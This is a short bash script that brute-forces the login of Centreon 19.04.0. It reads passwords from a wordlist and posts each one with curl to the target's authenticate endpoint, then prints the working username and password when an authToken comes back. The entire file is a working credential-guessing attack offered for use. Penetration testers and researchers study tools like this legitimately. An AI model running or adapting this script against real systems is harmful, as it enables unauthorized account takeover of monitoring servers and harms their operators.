#!/bin/bash

# Script to Brute Force Login For Centreon 19.04.0.
# Author Twitter @j_boogie_22
# Date: 08/01/2020

if [ "$3" == "" ]
then 
	echo "[-] Usage: ./centreon-bf.sh <IP> <User> <Wordlist>"
else
	for pass in $(cat $3)
	do 
		curl -s $1?action=authenticate -d "username=$2&password=${pass}" | grep authToken && echo -e "\e[1;31m [!] Successful Login! $2:$pass\e" && exit 1;
		echo "[-] Failed: $2:$pass"

	done
fi

